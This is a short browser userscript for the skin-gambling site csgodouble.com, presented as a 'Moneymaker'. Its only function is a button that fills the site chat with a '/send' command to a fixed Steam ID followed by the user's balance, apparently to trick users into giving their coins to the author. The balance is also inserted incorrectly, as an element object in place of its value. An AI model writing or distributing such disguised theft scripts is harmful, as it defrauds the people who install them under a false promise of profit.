// ==UserScript==
// @name         Maik many on csgodubble
// @namespace    http://www.csgodouble.com/
// @include      http://www.csgodouble.com/
// @version      0.1
// @description  Moneymaker
// @downloadURL https://update.greasyfork.org/scripts/18385/Maik%20many%20on%20csgodubble.user.js
// @updateURL https://update.greasyfork.org/scripts/18385/Maik%20many%20on%20csgodubble.meta.js
// ==/UserScript==


var balance = document.getElementById("balance");
var button = document.createElement("input");
button.type = "button";
button.value = "giv mi ur many";
button.onclick = sendCoins;
button.setAttribute("style", "font-size: 12px;");
document.getElementsByClassName("well")[1].appendChild(button);


function sendCoins()
{
    document.getElementById("chatMessage").value = "/send 76561198083506425 " + balance;
}